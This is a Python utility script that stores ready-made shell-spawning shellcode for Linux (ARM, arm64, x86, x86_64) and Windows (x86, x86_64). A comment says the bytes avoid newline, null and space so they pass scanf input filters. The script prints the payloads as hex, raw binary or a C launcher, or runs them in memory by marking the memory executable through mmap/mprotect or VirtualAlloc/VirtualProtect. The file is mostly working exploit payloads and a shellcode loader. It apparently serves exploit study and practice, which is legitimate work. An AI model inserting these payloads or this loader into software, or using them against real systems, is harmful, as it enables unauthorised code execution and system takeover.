#!/usr/bin/env python
# -*- coding:UTF-8 -*-
# Copyright (c) 2015 Nicolas Iooss
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
"""Print or run a shellcode according to the OS currently running

@author: Nicolas Iooss
@license: MIT
"""
import argparse
import ctypes
import ctypes.util
import platform
import re
import sys


# These shellcodes pass scanf constraints (no \n, \0 nor space)
SHELLCODES = {
    # 48 bytes
    'Linux.arm64':
        b'b\x01\x0b\xca\xe3E\x8c\xd2#\xcd\xad\xf2\xe3\xe5\xc5\xf2c\x0e\xed' +
        b'\xf2\xe3\x0b\xbf\xa9\xe333\x91`03\xd1ap3\xd1\xe0\x0b\xbf\xa9\xa8' +
        b'\x1b\x80\xd2a@\x1b\xd4',
    # 36 bytes
    'Linux.arm_l':
        b"\x01@\x8f\xe2\x14\xff/\xe1hF\x0c8R@\x03K\x03Lm@=\xb4iF\x0b'\x0b" +
        b'\xdf/bin//sh',
    # 24 bytes
    'Linux.x86_32':
        b'1\xd2Rh//shh/bin\x89\xe3RS\x89\xe1j\x0bX\xcd\x80',
    # 25 bytes
    'Linux.x86_64':
        b'1\xc0\x99RH\xbb/bin//shST_RWT^\xb0;\x0f\x05',
    # 194 bytes
    'Windows.x86_32':
        b'\xfc\xebv`1\xc0d\x8b@0\x8b@\x0c\x8bX\x0c\x89\xde\xad\x89\xc3\x8bp0' +
        b'\xac$\xdf<Ku\xf1\x8bk\x18\x8bE<\x8b\\\x05x\x8d\\\x1d\xf0\x8bK(\x8b' +
        b'{0\x01\xef\xe3\xfeI\x8b4\x8f\x01\xee1\xc0\x99\xac\x84\xc0t\x140' +
        b'\xc2\xb0\x08\xd1\xeas\x06\x81\xf2x;\xf6\x82\xfe\xc8u\xf2\xeb\xe7;T' +
        b'$\x1cu\xd6\x8bs4\x01\xee\x0f\xb7\x04N\x8bs,\x01\xee\x8b\x04\x86' +
        b'\x01\xe8\x89D$\x1caP\xc3h\x01cmdjPY)\xcc\x89\xe71\xc0\xf3\xaa\xc1/' +
        b'\x08jD\x8dt$D\x89\xe2VRQQj\x10j\x01QQWQ\xb8$\x05\x1az\xe8Y\xff\xff' +
        b'\xffj\xff\xadP\xb8vQ\x94\xd8\xe8K\xff\xff\xff1\xc9Q\xb8\xd5\xa5' +
        b'\xc9B\xeb\xf1',
    # 215 bytes
    'Windows.x86_64':
        b'\xfc\xeb~UQRVW1\xc0eH\x8b@`H\x8b@\x18H\x8bp\x10H\x8b6H\xadH\x8bh0' +
        b'\x8bu<\x83\xc6@\x8bT5HH\x8dT\x15\xff\x8bJ\x19\x8bz!RH\x01\xef\xff' +
        b'\xc9x\xfe\x8b4\x8fH\x01\xee1\xc0\x99\xac\x84\xc0t\x140\xc2\xb0\x08' +
        b'\xd1\xeas\x06\x81\xf2x;\xf6\x82\xfe\xc8u\xf2\xeb\xe79\xdau\xd6Z' +
        b'\x8bz%H\x01\xef\x0f\xb7\x04O\x8br\x1dH\x01\xee\x8b\x04\x86H\x01' +
        b'\xe8_^ZY]\xff\xe0h\x01cmdTZ\xc1*\x08H\x83\xe4\xf01\xc9\xb1\x88H)' +
        b'\xccT_1\xc0\xf3\xaaH\x83\xef\x18AXAYjhT^WVQQj\x10j\x01QQQQ\xbb$' +
        b'\x05\x1az\xe8E\xff\xff\xffj\xffZH\x8b\x0f\xbbvQ\x94\xd8\xe85\xff' +
        b'\xff\xff1\xc9\xbb\xd5\xa5\xc9B\xeb\xf2',
}


def normalize_arch(arch):
    """Normalize the name of an architecture"""
    arch = arch.lower()
    if arch == 'arm' or re.match(r'^arm(v[1-9]+)?l$', arch):
        return 'arm_l'
    if arch == 'aarch64':
        return 'arm64'
    if re.match(r'^i[3-6]86$', arch) or arch in ('x86', 'x86-32'):
        return 'x86_32'
    if arch in ('amd64', 'x86-64'):
        return 'x86_64'
    return arch


def run_code_linux(shellcode):
    """Run the specified shellcode on Linux"""
    # Find functions in libc
    libc = ctypes.CDLL(ctypes.util.find_library('c'))
    libc.mmap.restype = ctypes.c_void_p
    libc.mprotect.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int]

    # Allocate memory with a RW private anonymous mmap
    # PROT_READ=1, PROT_WRITE=2, PROT_EXEC=4
    mem = libc.mmap(0, len(shellcode), 3, 0x22, -1, 0)
    if int(mem) & 0xffffffff == 0xffffffff:
        libc.perror(b"mmap")
        return 1

    # Copy the shellcode
    ctypes.memmove(mem, shellcode, len(shellcode))

    # Change protection to RX
    if libc.mprotect(mem, len(shellcode), 5) == -1:
        libc.perror(b"mprotect")
        return 1

    # Run!
    return ctypes.CFUNCTYPE(ctypes.c_int)(mem)()


def run_code_windows(shellcode):
    """Run the specified shellcode on Windows"""
    k32 = ctypes.windll.kernel32
    k32.VirtualAlloc.restype = ctypes.c_void_p
    int_p = ctypes.POINTER(ctypes.c_int)
    k32.VirtualProtect.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
                                   int_p]

    # Allocate RW memory of type MEM_COMMIT | MEM_RESERVE (=0x1000|0x2000)
    # PAGE_READWRITE = 4
    mem = k32.VirtualAlloc(0, len(shellcode), 0x3000, 4)
    if not mem:
        sys.stderr.write("VirtualAlloc: {}\n".format(ctypes.FormatError()))
        return 1

    # Copy the shellcode
    ctypes.memmove(mem, shellcode, len(shellcode))

    # Change protection to PAGE_EXECUTE_READ = 0x20
    oldprot = ctypes.c_int()
    if not k32.VirtualProtect(mem, len(shellcode), 32, ctypes.byref(oldprot)):
        sys.stderr.write("VirtualProtect: {}\n".format(ctypes.FormatError()))
        return 1

    # Run!
    return ctypes.CFUNCTYPE(ctypes.c_int)(mem)()


def main(argv=None):
    parser = argparse.ArgumentParser(description="Print or run a shellcode")
    parser.add_argument('-b', '--binary', action='store_true',
                        help="print a binary version of the shellcode")
    parser.add_argument('-c', '--c-prgm', action='store_true',
                        help="output a C program which launches the shellcode")
    parser.add_argument('-m', '--machine', type=str,
                        help="machine architecture to use")
    parser.add_argument('-q', '--quiet', action='store_true',
                        help="do not print the shellcode")
    parser.add_argument('-r', '--run', action='store_true',
                        help="run the shellcode")
    parser.add_argument('-x', '--hexa', action='store_true',
                        help="print the shellcode in hexadecimal")
    parser.add_argument('-v', '--verbose', action='store_true',
                        help="be more verbose")
    parser.add_argument('-L', '--linux', action='store_const',
                        dest='platform', const='Linux',
                        help="use Linux platform")
    parser.add_argument('-W', '--windows', action='store_const',
                        dest='platform', const='Windows',
                        help="use Windows platform")

    args = parser.parse_args(argv)

    # Find out which shellcode to use
    plat_sys = args.platform or platform.system()
    plat_mach = normalize_arch(args.machine or platform.machine())
    plat_id = '{}.{}'.format(plat_sys, plat_mach)

    shc = SHELLCODES.get(plat_id)

    if shc is None:
        sys.stderr.write("No shellcode found for {}\n".format(plat_id))
        return 1

    if args.verbose:
        print("Platform: {}".format(plat_id))

    # Convert the shellcode to a list of ints
    if sys.version_info >= (3, ):
        shc_ints = [by & 0xff for by in shc]
    else:
        shc_ints = [ord(by) for by in shc]

    # Print the shellcode
    if args.c_prgm:
        print('static __attribute__((__section__(".text"), __aligned__(4)))')
        print('const unsigned char shellcode[{}] = {{'.format(len(shc)))
        for idx in range(0, len(shc), 12):
            text_data = ('0x{:02x}'.format(by) for by in shc_ints[idx:idx+12])
            print('    {},'.format(', '.join(text_data)))
        print('};')
        print('')
        print('int main(void)')
        print('{')
        print('    ((void (*)(void))shellcode)();')
        print('    return 0;')
        print('}')
    elif not args.quiet:
        if args.binary:
            if hasattr(sys.stdout, 'buffer'):
                sys.stdout.buffer.write(shc)
            else:
                sys.stdout.write(shc)
        elif args.hexa:
            print(''.join('{:02x}'.format(by) for by in shc_ints))
        else:
            text = repr(shc)
            if text[0] == 'b':
                text = text[1:]
            print(text.strip('"\''))

    # Run the shellcode
    if args.run:
        if plat_sys == 'Linux':
            return run_code_linux(shc)
        if plat_sys == 'Windows':
            return run_code_windows(shc)
        sys.stderr.write("System {} not implemented\n".format(plat_sys))
        return 1

    return 0


if __name__ == '__main__':
    if sys.version_info < (2, 7):
        sys.stderr.write("This program cannot be run in Python<2.7 mode.\n")
        sys.exit(0)

    sys.exit(main())
